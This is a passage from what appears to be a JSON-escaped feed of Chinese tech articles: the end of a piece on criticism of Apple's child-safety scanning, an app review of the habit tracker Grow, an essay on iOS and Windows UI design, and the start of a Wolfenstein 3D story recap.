内容检测功能，在传统媒体、行业专家和资深用户中引发了广泛的讨论，现有观点普遍就儿童安全功能对用户隐私和设备安全的潜在影响表达了担忧。</p>\n<p>究其原因，首先，Apple 此次在沟通方式上存在考虑不周之处。官方给出的说明没有区分信息 app 和 iCloud 图库在检测技术、适用群体和处置方式上的显著差异，而是一并作为「儿童安全功能」来宣传。这在最初引发了很多混淆。作为回应，Apple 后来专门发布了一则 <a href=\"https://www.apple.com/child-safety/pdf/Expanded_Protections_for_Children_Frequently_Asked_Questions.pdf\" target=\"_blank\">官方问答</a>，开篇即再次强调两者的区别。</p>\n<p>其次，就检测和举报 iCloud 图库中的违法内容而言，尽管为儿童安全而配合执法是完全正当的，但很难保证为此而开的先例不会被滥用（无论从技术还是政策上）。对此，知名互联网权利组织电子前线基金会<sup class=\"ss-footnote\" href=\"\" title=\"Electronic Frontier Foundation，EFF\" footnote-id=\"7\">7</sup>的观点最具代表性。EFF 认为，iMessage 内容检测功能可以被用来「开后门」——如果 Apple 能把儿童色情图片信息上报给家长，谁来保证用户的其他敏感信息不被报告给其他监管部门呢？换句话说：</p>\n<blockquote>\n<p>It's impossible to build a client-side scanning system that can only be used for sexually explicit images sent or received by children.</p>\n<p>想要开发一个事实上可以扫描一切，但仅仅被用来检测儿童收发的色情图片的客户端系统是不可能的。</p>\n</blockquote>\n<p>第三，就信息 app 的非法内容检测而言，现有实践表明基于算法的检测或许并不能达到 Apple 宣称的可靠性。根据 Apple 的说法，信息 app 中使用的检测算法将能把出错率限制在一万亿分之一。</p>\n<p>然而，图像处理领域的博客 RENT-A-FOUNDER <a href=\"https://rentafounder.com/the-problem-with-perceptual-hashes/\" target=\"_blank\">指出</a>，Apple 图像匹配算法的核心「感知性哈希值」<sup class=\"ss-footnote\" href=\"\" title=\"这里指的是 perceptual hashing 技术\" footnote-id=\"8\">8</sup>在市面上已经有类似的技术，但这种技术在很多情况下仍然不能避免错误。例如，很多类似技术会认为将下面两张图片混为一谈：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49kq4tb34tdfon49stg.jpeg\"><figcaption>图源：见水印，由 RENT-A-FOUNDER 整理</figcaption></figure><p>RENT-A-FOUNDER 指出，他们的业务主要是出于避免盗版图片的目的使用检测技术，但在儿童安全这一更为严肃的场景下，无论是误报还是漏报，后果都是更加严重的。</p>\n<p>互联网隐私领域的博客 THE HACKER FACTOR BLOG 则对「一万亿分之一」这一数字的可信度提出了质疑。文章 <a href=\"https://www.hackerfactor.com/blog/index.php?/archives/929-One-Bad-Apple.html\" target=\"_blank\">指出</a>，既然 Apple 一向宣称对用户隐私不感兴趣，如何能得到一万亿份图像资料来印证这种准确性呢？如果训练素材的图片是来自第三方，那么其可靠性也不是 Apple 可以控制的。即使这个比例的依据是算法考虑的图片特征数量，「感知性哈希值」技术的 AI 属性也导致其错误率不是可以精准计算的。因此，「一万亿分之一」更可能只是一种估测和宣传口径。</p>\n<p>关于这次儿童安全功能互联网上还有很多关于其他技术细节的讨论，受文章篇幅的影响没有办法一一列出。你对这项新功能有什么看法，或是有什么技术细节想要讨论，欢迎大家在评论区理性地留言和讨论。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68212"},{"title":"[送码] 自动化健康记录和习惯养成工具，Grow 想给你「完美每一天」","date":"2021-08-11 06:43:50","description":"\n<p>从功能强大又复杂的 <a href=\"https://sspai.com/post/36301\" target=\"_blank\">Productive</a> 到小而美的 <a href=\"https://sspai.com/prime/story/vol03-habitify\" target=\"_blank\">Habitif</a><a href=\"https://sspai.com/prime/story/vol03-habitify\">y</a>，我们已经见过了不少习惯养成类的应用。可是，这一类 App 并不能直接帮助我们养成好习惯，因为日常坚持使用它们本身就是一件需要养成的习惯。在《掌握习惯》一书中，作者在谈及「怎样天天保持好习惯时」就提到「 只要有可能，测量应该⾃动化 」。</p>\n<p>昨日刚刚上架 App Store 的习惯追踪应用 Grow 就遵循了这一原则，让手机自动记录用户的习惯进度，不需要消耗多余的精力来管理，让习惯养成成为一件愉悦的事情，精美的设计风格也在已上架让其获得了不少用户的好评。</p>\n<h2>自动记录，从不错过</h2>\n<p>Grow 的习惯记录与 iOS 系统本身的健康数据进行了深度绑定，包括步数、睡眠、跑步距离、能量、正念分钟数等数据会自动导入到 Grow 中，当有新的运动记录产生时会第一时间更新，一旦设定的目标达成就会自动打卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c495uj5b34tde822sib0.jpeg\"></figure><p>在 Grow 中，每一个习惯都被设计成了一张精美的卡片展示在首页。在卡片上，我们可以清晰地掌握这个习惯在当天的进度，还可以了解当前一周的完成情况。如果我想了解关于这个习惯更多的信息，点击卡片进入详情页后，可以看到趋势和设置两个模块。</p>\n<p>在趋势模块中，我可以看到连续完成天数、历史完成率、总数、每日平均数等 4 个数据，并且卡片上的周视图拓展成了时间区间更大的月视图。而在设置模块中，我可以任意更改这个习惯的目标数和消息通知的触发进度，充分满足了每一个人的个性化需求。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c495ujlb34tde822sibg.jpeg\"></figure><h2>每日小结，天天进步</h2>\n<p>除了习惯卡片的瀑布式展示，Grow 还有一个单独的每日小结页面，聚合了我所有的习惯目标和完成情况，并且会根据完成进度来计算出当天的完成百分比。如果我完成了所有目标，就可以赢取今日份的完美一天奖牌。</p>\n<p>有意思的是，就算我没有 100% 完成当天的目标，但只要达到 80% 的进度以上，也会得到一块银色奖牌以资鼓励。如果当天真的有特殊情况，那么我还可以选择跳过某个习惯，这样也可以确保我的进步不被影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/a546ac238d40b58bd5356b100ed1bfcf.jpeg\"></figure><p>在每日小结中，我还有一个自己非常喜欢的小功能，那就是日记。每一天都可以添加一个最多 200 字的日记，在某种程度上可以作为专门的日记 App 了，而 Grow 也让我更加有动力去记录每天发生的美好瞬间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/c265769859bd2261ff7251ad1e7aaa1b.jpeg\"></figure><h2>奇妙巧思，个性十足</h2>\n<p>作为一款设计交互方面非常出彩的 App，Grow 在很多细节上的打磨让我忍不住赞叹。</p>\n<ul>\n<li>当我在每日小结的页面上切换不同的日期时，Grow 会利用 iPhone 的 Haptic Engine，在进度条滑动的同时模拟出震动的手感；</li>\n<li>多不同风格的桌面小组件，精美又高效，可以满足我对查看信息不同的需求；</li>\n<li>20 多款设计别致的应用图标，充分表达使用者对这款应用的不同理解；</li>\n<li>关于界面中的图标弹珠在倾斜手机时会跟着移动；</li>\n<li>设置界面的小彩蛋。</li>\n</ul>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/51abaf35ecc1271c68d64bd99c6395f8.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/ea21b546a00d305393f0bb443ee17118.PNG\" alt=\"\"></figure><h2>送码</h2>\n<p>目前，Grow 已经在 <a href=\"https://apps.apple.com/cn/app/id1560604814\" target=\"_blank\">App Store</a> 开放下载，大家可以免费下载使用，解锁会员可以获得所有的习惯，所有可爱又健康的小组件，iCloud 同步、无限次跳过次数、专属的应用图标等功能，同时目前正在进行首年 88 元 30% 的优惠，次年按 128 元订阅价格，永久买断版本售价 258 元。</p>\n<p>在评论区说说你对 Grow 的看法和建议，你在用哪些类似的健康类 App，下周一 (08.16) 选出一位读者获得 Grow 年订阅兑换码。</p>\n<span class=\"ss-application\" app-id=\"16138\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68204"},{"title":"对系统审美疲劳了？从 iOS 的设计出发探索更多答案","date":"2021-08-11 03:37:33","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>我是老人，一名设计师。由于最近的设计方向都逐渐趋同，以及最近发布的 Windows11 也开始采用圆角设计，让我有了写这篇文章的想法。</p>\n<p>我想告诉你：不要停滞不前，去寻找更多答案。</p>\n<h2>「圆角」并不是唯一的答案</h2>\n<p><strong>iOS 一直以来就是圆角的代表作。应用到到界面设计，其处处圆润的视觉体验无疑是令人愉悦的。从 iPhoneX 采用圆角屏幕开始，我们可以看见苹果对「圆角」有多狂热。</strong></p>\n<p>但「圆角」并不是唯一的答案。事实上，在设计中，从来就没有唯一的答案。</p>\n<h3>直角也能赏心悦目</h3>\n<p><strong>「</strong>Windows 8」便是一个典型的例子。从 Windows 7 到 Windows 8 ，微软开始大范围使用锋利的直角，抛弃了 Windows 7 绚丽的 Aero 效果，转而使用大色块和丰富的动效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/f0d688e0ddf369143aad7f7386c7567a.png\"><figcaption>「开始」屏幕</figcaption></figure><p>「开始」屏幕虽然为许多人所不适应，但其独树一帜的直角色块设计，依然为 Windows 创造了独一无二的视觉体验，使微软和 Windows 的形象变得锋利，鲜明，这都要归功于「直角」给人高冷，坚韧的感觉。这是「圆角」所不可及的。</p>\n<p>仔细观察，开始屏幕中的磁贴并非简单的「单一色块」，而是采用了微量的渐变色与描边来丰富层次；同样，扁平的 Windows 8 并非只有「大色块 + 文字」，其中还采用了丰富的动效，使得界面鲜活起来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/d9e4ec6afb4e49330a07a92b142809fa.png\"><figcaption>「磁贴」 并非单一色块</figcaption></figure><p>但是很遗憾。「Windows 8」这款超前的系统，陨落在了不属于它的时代。从 Windows 10 开始，磁铁与动效设计被刻意淡化；在最新的 Windows 11 中，直角设计被完全放弃。</p>\n<h3>直角能与圆角并存</h3>\n<p>从 iOS 10 到 iOS 11 ，苹果为数字小键盘也加上了圆角设计，此举引发网友不满。大量用户吐槽新设计「更丑」了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/89b813189fed428985eaaefd19314964.png\"><figcaption>我承认右边的看起来确实更丑了</figcaption></figure><p>很显然该改动是为了响应 iPhone X 「处处圆角，处处圆润」的号召，强行把小键盘改成了圆角按钮。其违和感扑面而来。为什么不试试让直角与圆角共存呢？</p>\n<p>同样的例子在 Chrome 桌面版上也有体现。在 Chrome 69 版本中， Google 悄然将原先带有棱角的标签页，改成了完全的圆角，其描边也被一同抛弃。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/6d6b15ae34c354dac54aa193b5cb5ce8.png\"><figcaption>可能 Chrome 团队的审美确实非常独特</figcaption></figure><p>由于 Chrome 几乎是全球用户量最多的浏览器，此举引发的骂声铺天盖地而来。reddit 上关于最新版 Chrome 69 的讨论无非是「complain about chrome 69 (对 Chrome69 的抱怨）」以及「how to disable round corner in chrome 69 （如何在 Chrome69 中关闭圆角）」。</p>\n<p>不过后来的事情大家也都知道了。 Google 依旧我行我素，不仅没有把棱角改回来，还关闭了「回到旧版标签页」的隐藏选项；大量网友怨声载道，只能忍气吞声继续使用 Chrome。（谁叫 Chrome 市场份额第一名）</p>\n<p>这是两个反面例子，用以告诉你：<s> 我喜欢直角 </s>直角也是优秀的设计。</p>\n<h2>「高斯模糊」并不是唯一的答案</h2>\n<p>自 iOS7 问世以来，苹果开始大规模在界面中采用「高斯模糊」的设计。原先这种模糊算法仅被应用于照片处理等场景。而 iOS 7 几乎可以称得上是将模糊算法应用到用户界面的开山鼻祖。<s> 其实是抄 Windows 7 的</s></p>\n<h3>用法</h3>\n<p>这块内容并不是要讨论高斯模糊的缺点（其实缺点也显而易见，实时模糊吃显存），而是讨论：<strong> 还有没有替补高斯模糊的设计方案 </strong>。</p>\n<p>仔细观察高斯模糊在 iOS 中的运用：他们都有一个共同点，那就是 <strong>都被用于模糊无关的背景，从而实现对中心内容的聚焦。</strong> 这模拟了摄影中背景虚化的效果，也最接近人眼观察事物的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/1ae5e610195c9131dc721e9e296ccf18.png\"><figcaption>「聚焦」效果</figcaption></figure><p>了解了高斯模糊的用在哪些方面，我们便能发散思维，使用其他效果来替代高斯模糊。下面列出两种各大厂商用的最多的替代方案：</p>\n<h3>平均</h3>\n<p>平均是一种图像算法。顾名思义，就是从一张包含<strong>许多色彩</strong>的图片（也就是壁纸）中，平均出最能代表原图片的<strong>单一颜色。</strong> 也就是我们常常说的「提取主题色」。</p>\n<p>那么提取了主题色有什么用呢？我们把本应为高斯模糊的地方覆盖上主题色不就行了！像这样：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/c2f06ca8357252794b4603ddfcc29be1.png\"><figcaption>不同的算法提取的主题色不同，这只是一个典型例子</figcaption></figure><p>看到这里，你应该想起来了当时 Android 5.0 带来的 Material Design，其中广泛运用了「平均」。</p>\n<h3>半透明</h3>\n<p>在高斯模糊还没普及到用户界面的时候，半透明几乎是最火的 UI 元素：Apple 在用，华为也在用，各种大小厂商都跟风在用。这几乎是最简单的替换高斯模糊的方案，同时也很美观。</p>\n<h2>「统一」并不是唯一的答案</h2>\n<h4>我们总是喜欢看到整洁统一的设计，无论是整洁的餐桌，整洁的房间，在 iOS 中亦是如此。但我们是否需要为了统一而统一呢？</h4>\n<h3>过度「统一」的侧边栏</h3>\n<p>苹果对于 iPad 的生产力尤为看重。为了使 UI 设计在这一点上得到响应，从 iPadOS 14 开始，苹果开始大范围在内建 App 上采用「侧边栏」的设计，意图即是与 MacOS 中的侧边栏统一，带来「更具生产力」的体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/77cb0e837569699132a68bc4c66ba2da.png\"><figcaption>一眼看过去似乎还不错 ...</figcaption></figure><p>愿景很美好。但是，这么做，真的对吗？<s> 不对</s></p>\n<p>让我们以 iPad 的「侧边栏」设计和原先的设计做个对比：原本的导航栏上有四个简洁易懂的图标，作为 App 的主导航，在页面下方居中显示，占用的空间也很小，直观且一目了然；</p>\n<p>而为了与 macOS 的侧边栏强行达到统一，原本的导航栏被移至页面左方，占用大量空间，同时内部填充大量图标，架构混乱，不再简洁。你仍然可以隐藏或显示侧边栏来扩展屏幕，不过这需要执行额外的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/d25aec54630341a4d50df276233accef.png\"><figcaption>当我打开相册，我最想点选左边的按钮，而不是右边的</figcaption></figure><p>这就使得侧边栏像一个袋子，苹果把什么东西都往里面装，没有分类，没有聚焦，唯一的好处便是与 macOS 形成了统一。</p>\n<p>但这并不是苹果完成「统一」大业的最后一步。在最新的 iPadOS 15 预览版中，苹果甚至为 Safari 浏览器加入了「侧边栏」设计，消耗大块的面积，用途仅仅是为了显示「书签」「阅读列表」「历史记录」以及一个意义不明的新功能「标签组」；你需要反复呼出侧边栏来找到相应的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/226cbdaefe4693b6496704535eaa7aaa.png\"><figcaption>其他 App 就算了，Safari 里加侧边栏实在是多此一举</figcaption></figure><p>作为上亿 iPad/iPhone 用户的默认浏览器，iPad OS 15 / iOS 15 还带来了许多不可思议的问题：</p>\n<ul>\n<li>「刷新网页」操作居然需要进入二级菜单；</li>\n<li>十多个常用选项填充在一个「…」二级菜单中；</li>\n<li>要访问你的书签，「只需」执行三步。</li>\n</ul>\n<p>我没准备开始吐槽 Apple 清奇的设计思路，Reddit 上的 #iOS 15 Safari 标签下已经聚集了许多不满的声音。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/6de7cea2be1e06043426a6526c0f2836.png\"><figcaption>完全赞同</figcaption></figure><h3>在纷繁中建立秩序</h3>\n<p>显示，上方是一个 iOS 在统一上失败的例子，但这并不是说不需要统一。我们来看看一个成功的例子：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/a049bc07149534be32a121de08fc8535.png\"><figcaption>微软的商店确实该改改了</figcaption></figure><p>如果要说「iOS 的应用商店」相较「Windows 的应用商店」有什么成功之处的话，那么我认为 iOS 的应用商店最大的优势便是<strong>对每个 App 采用了「统一」的形状约束 </strong>。</p>\n<p>试问如果你去超市购物，是愿意看到各个商品都整整齐齐的，还是乱丢乱放的呢？iOS 的应用商店在这一点上尤为出色。</p>\n<h2>寻找更多答案</h2>\n<p>我们已经走出了 iOS 之外寻找答案，这篇文章就到这里结束了。但试着迈向更深处吧，比如「全 3D 建模 UI」；又或是「智能感知设计」。还有那些区域是我们从未探索过的呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/af29876d1ddf78a86fb245cfc37e616b.png\"><figcaption>图源 Dribbble，基于 Blender 制作</figcaption></figure><p>我们永远不会停止寻找答案。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\"> 冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67994"},{"title":"《德军总部》系列到底讲了一个什么故事？","date":"2021-08-11 03:00:32","description":"\n<p>大名鼎鼎的《德军总部》相信不少玩家都很熟悉，年轻的玩家一般是从贝塞斯达发行的《德军总部：新秩序》和《德军总部：新巨像》最先接触的，年长一些的是从2009年动视发行的《德军总部》开始玩的，或者是更早一些的《重返德军总部》，一般只有那些游戏老炮们才玩过30年前的原版《德军总部3D》。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-245b25c76f54ee3d0cdd58de4fa6ef48_720w.png?rss\" data-caption=\"《德军总部》系列发展中游戏主角B.J. Blazkowicz形象的改变，第一格为92年《德军总部3D》的版本，第二格是01年的《重返德军总部》，第三格是09年的《德军总部》，第四格为14年由《新秩序》开启的新系列\" data-size=\"normal\" data-rawwidth=\"1692\" data-rawheight=\"509\" data-watermark=\"original\" data-original-src=\"v2-245b25c76f54ee3d0cdd58de4fa6ef48\" data-watermark-src=\"v2-376c417814d7f77e4feeedfced115209\" data-private-watermark-src=\"\"></p>\n<p>1992年，游戏开发商id Software推出的《德军总部3D (Wolfenstein 3D)》震惊了世界，约翰·卡马克、约翰·罗梅罗与他们的id工作室名声大噪，后来他们推出的《毁灭战士 | DOOM》系列更是深刻的改变了游戏史。对于《DOOM》系列大家了解的应该比较多，我在之前的文章中也详细讲过《DOOM》、《DOOM II》、《Final DOOM》、《DOOM 64》以及《DOOM 3》的全部剧情故事。</p>\n<ul>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/123228033\" class=\"internal\">原汁原味！带你领略原版的《DOOM》、《DOOM II》和《Final DOOM》全部剧情</a></b></li>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">原汁原味！带你领略《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">NRFTL</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》、《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">DOOM 64</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》和《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">DOOM 3</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》全部剧情</a></b></li>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/394933213\" class=\"internal\">原汁原味！带你领略老《德军总部3D》和《命运之矛》的全部剧情故事</a></b></li>\n</ul>\n<p>相对来说，大家对于老《德军总部》的关注度并不高，原因其实也很简单，就是用现在的眼光看老《德军总部》实在是太落后了。由于几乎是最早的FPS游戏，《德军总部3D》的画面非常简陋，画面分辨率低，没有地板天花板贴图，场景重复度高，实际上不是真3D（射线发射法），无法上下瞄准，要同时按住alt键才能左右平移……而且游戏的枪械只有3种，敌人种类也不丰富，最令人头疼的一点是没有地图，而游戏到处又看起来几乎都一样，因此需要不少时间在沉闷的迷宫中找路，堪称“迷路模拟器”。基于以上原因，我是不会推荐大家像我自己一样去玩上20多个小时的（加上后面会说到的资料片）。如果实在想玩，可以用ECWolf（类似GZDOOM），修复了很多我上面提到的问题。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a37470f0fc7f6ff842a10753e3fe1cf8_720w.png?rss\" data-caption=\"或许现在看起来很简陋，但92年大家见到时都会被这梦想中的游戏方式所折服，而且本作和你现在玩的FPS区别已经非常小了\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-a37470f0fc7f6ff842a10753e3fe1cf8\" data-watermark-src=\"v2-aec072053ab42e4ee4348aaafc58316b\" data-private-watermark-src=\"\"></p>\n<p>虽然不推荐大家亲自尝试《德军总部3D》，但对于想从头了解《德军总部》系列故事的玩家，我从《德军总部》里截出了最原汁原味的故事内容，并对全部文本进行了翻译，保证大家对于其中有趣的内容一点不落。注意，以下所有游戏中的截图均来自Steam上的版本，两款游戏也都可以在Steam上轻松买到。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c23f6f918685eb288b75242db961fea7_720w.png?rss\" data-caption=\"其实在《德军总部：新秩序》里也可以在主角睡觉的时候穿越到《德军总部3D》中游玩，《新巨像》中甚至还有专门的街机玩这个\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-c23f6f918685eb288b75242db961fea7\" data-watermark-src=\"v2-adb2d231c0b4b4a5fc2a433e4a9a680f\" data-private-watermark-src=\"\"></p>\n<p>另外，还想提一下大家关于该系列游戏可能存在的两个无伤大雅的误解，第一个是《德军总部3D》并非严格意义上的世界第一款第一人称游戏，只是那时最被大众所熟知的，当然这也并不影响其在FPS届的地位。第二个是该游戏系列并非id Software工作室最早原创，早在1981年《德军总部 | Castle Wolfenstein》就已发行，并在1984年推出续作《Beyond Castle Wolfenstein》，但两部作品都是俯视角潜入游戏，id工作室是购买的对方的版权。闲话够多了，正式开始看游戏吧。</p>\n<h2>·《德军总部3D (Wolfenstein 3D)》</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-ce8973903a2fa2a991cdbcb7707bb432_720w.jpeg?rss\" data-caption=\"《德军总部3D (Wolfenstein 3D)》的两款封面，Steam版本所用的为左侧版本\" data-size=\"normal\" data-rawwidth=\"1201\" data-rawheight=\"920\" data-watermark=\"original\" data-original-src=\"v2-ce8973903a2fa2a991cdbcb7707bb432\" data-watermark-src=\"v2-ac4c79fabaa48b634353abb907e39194\" data-private-watermark-src=\"\"></p>\n<p>不知道你玩《德军总部3D》第一关的时候有没有想过为什么我们会出现在监狱之中，如果你熟悉90年代游戏发行，或者看过我关于《DOOM》系列的文章，那么你很可能会猜到《德军总部3D》也有一本使用手册，如果你有兴趣，可以点击<b><a href=\"http://link.zhihu.com/?target=http%3A//www.abandonia.com/files/extras/23636_game_extra_1.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">下载</a></b>。其中第二页介绍头一章“逃出狼穴”的时候就列出了<b>至今的故事（The Story So Far）</b>：</p>\n<ul>\n<li><i>你是威廉·J·布拉斯科维奇，又称B.J.（William J. \"B.J.\" Blazkowicz），盟军间谍中的坏小子，专门执行终极行动。你的任务是潜入纳粹堡垒海尔汉默城堡（Castle Hollehammer），找出铁拳行动（Eisenfaust，Iron Fist）的计划书——纳粹建造完美军队的蓝图。有传言说，在海尔汉默城堡深处，恐怖的沙布斯（Schabbs）博士已经完美掌握了用死尸建造一支凶猛军队的技术。这怎么可能呢，如果不是过于变态，听起来也太荒唐了。但是，万一是真的呢？</i></li>\n<li><i>你没有机会查出真相了！你在准备拿取秘密计划书时被抓获，被带到了纳粹的监狱狼穴（Castle Wolfenstein）中接受审问并将最终被处决。现在，你已经被囚禁在城堡要塞下十二天了。就在你的牢房门外，坐着一个脖子很粗的纳粹守卫。那天早上之前，他协助一名党卫军牙医，或者是机械师准备电击你的扁桃体。你快要崩溃了！你在地板上颤抖着乞求用信息换取医疗救助。他伸手去拿钥匙，脸上露出胜利后得意洋洋的狞笑。他打开门——锁栓声回响在走廊中，门吱吱嘎嘎地开了。他犯了大错！</i></li>\n<li><i>你只在他膝盖上踢了一脚就让他倒在了地板上。你一边摆出自己版本的胜利动作，一边抢过他的刀很快结果了他。站在守卫倒地的尸体旁，你疯了似地抓过他的枪。你并不确定其他守卫有没有听到他低沉的尖叫声。在纳粹地牢的深处，你必须逃出去。刚才孤注一掷的行动已经注定了你的命运——要么逃出去，要么死。</i></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-b388934ff8a6f7b86b101caffe6cba60_720w.png?rss\" data-caption=\"游戏开场画面，紧紧衔接“至今的故事”\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-b388934ff8a6f7b86b101caffe6cba60\" data-watermark-src=\"v2-e5fd174077ef33aea3a32e6995fa380e\" data-private-watermark-src=\"\"></p>\n<p>初代的《德军总部3D》总共有六个章节，每个章节一般总共九关，外加一个隐藏关卡，每个章节的最后一关都是BOSS关卡。其实原本《德军总部3D》只有前三章，后三章是后来加入的前传关卡，名为“夜行任务（Nocturnal Missions）”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7f260e97904debd4f0902ecf9356cf13_720w.jpeg?rss\" data-caption=\"《德军总部3D》选关画面\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-7f260e97904debd4f0902ecf9356cf13\" data-watermark-src=\"v2-a4cfe6195099294dc46f04b5da6e7a53\" data-private-watermark-src=\"\"></p>\n<h2>—第一章：逃出狼穴（Escape from Wolfenstein）</h2>\n<p>我们在每一关中的主要任务就是杀纳粹，找钥匙开门，然后去电梯前往下一层（或许是上一层）。同时，我们也可以收集纳粹的财宝，并在每一关中寻找秘密地点。最后一关的关底BOSS为Hans Grosse，手持两把链式机枪。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1cca2a317923fe9f5bdc315584daac81_720w.png?rss\" data-caption=\"第一章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-1cca2a317923fe9f5bdc315584daac81\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>干掉BOSS拿到金钥匙之后，我们逃出了狼穴，看得到外面的蓝天青草地，伴随着镜头一转，我们能正面看到兴奋的B. J.一跃而起。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f28178755cd524cecde06288b562a36f_720w.png?rss\" data-caption=\"第一章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-f28178755cd524cecde06288b562a36f\" data-watermark-src=\"v2-d72a82c5637cd6eb51429ee88638b81b\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>你逃出了城堡，并与地下组织取得了联系。他们告诉你传言是真的：有人在海尔汉默城堡附近见过可怕的人体实验。所以，铁拳行动是真的！</b></li>\n<li><b>你必须去那，在疯狂的沙布斯博士反人类的不死军团出击之前消灭他！</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-594006941dedbc0b1ff732bbf2e1d370_720w.png?rss\" data-caption=\"实际上这是游戏的宣传语，并非剧情内容\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-594006941dedbc0b1ff732bbf2e1d370\" data-watermark-src=\"v2-6e5b034b26a3f16a5ed639fea4e73096\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>更多内容</li>\n<li>在第三章中，当第三帝国瓦解之时，希特勒藏在巨型地堡中。你的任务就是刺杀他，结束他的疯狂统治。</li>\n<li>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！</li>\n</ul>\n<h2>—第二章：铁拳/艾森福斯特行动（Operation: Eisenfaust）</h2>\n<p>本章开始出现新的敌人——丧尸兵，最终的关底BOSS为沙布斯博士，投掷装满毒药的注射器进行攻击。将其击败之后，还能看到沙布斯博士的死亡画面重播，哈哈。</p>\n<p><img 